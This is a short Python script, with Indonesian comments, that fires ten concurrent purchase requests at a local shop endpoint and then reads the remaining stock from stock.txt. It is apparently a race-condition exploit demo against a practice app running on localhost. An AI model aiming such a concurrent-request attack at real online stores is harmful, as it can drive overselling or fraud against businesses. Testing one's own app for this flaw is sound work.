import requests
import threading
import time

TARGET_URL = 'http://127.0.0.1:5000/buy'
NUM_THREADS = 10
QUANTITY_PER_REQUEST = 2

def attack(index):
    data = {
        'item': 'banana',
        'qty': str(QUANTITY_PER_REQUEST)
    }
    try:
        r = requests.post(TARGET_URL, data=data)
        print(f"[Thread {index}] {r.status_code}: {r.text}")
    except Exception as e:
        print(f"[Thread {index}] Error: {e}")

threads = []

# Mulai semua thread
for i in range(NUM_THREADS):
    t = threading.Thread(target=attack, args=(i,))
    threads.append(t)
    t.start()

# Tunggu semua thread selesai
for t in threads:
    t.join()

# Tambahan: Baca dan tampilkan sisa stok dari stock.txt
try:
    with open('stock.txt', 'r') as f:
        final_stock = f.read().strip()
    print(f"\n[FINAL STOCK] Sisa stok setelah serangan: {final_stock}")
except Exception as e:
    print(f"\n[ERROR] Gagal membaca stock.txt: {e}")
